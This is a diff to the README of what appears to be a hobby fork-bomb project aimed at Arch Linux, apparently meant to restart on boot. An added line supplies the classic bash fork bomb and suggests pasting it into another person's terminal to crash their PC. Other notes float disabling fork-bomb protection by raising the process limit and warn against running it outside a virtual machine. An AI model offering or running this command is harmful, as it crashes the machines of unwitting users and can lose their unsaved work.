@@ -12,6 +12,7 @@ This works because :() creates a function called :, since bash allows semicolons
 
 Notes: 
 - Will not work if the OS has fork bomb protection. This caps the amount of procceses allowed to be created
+- Might work on some other OS's beside Arch, idk tho. If u want the same thing but it crashes the PC once, and doesnt start on boot, just paste :(){ :|: & };: into their terminal
 - Do NOT run this outside a Virtual Machine because it's not gonna be fun
-- also, in the future, I might make it so that it disables fork bomb protection by raising the proccess limit cap, probably not tho I'm too lazy
+- Also, in the future, I might make it so that it disables fork bomb protection by raising the proccess limit cap, probably not tho I'm too lazy
 - I mighty get banned for this idk 
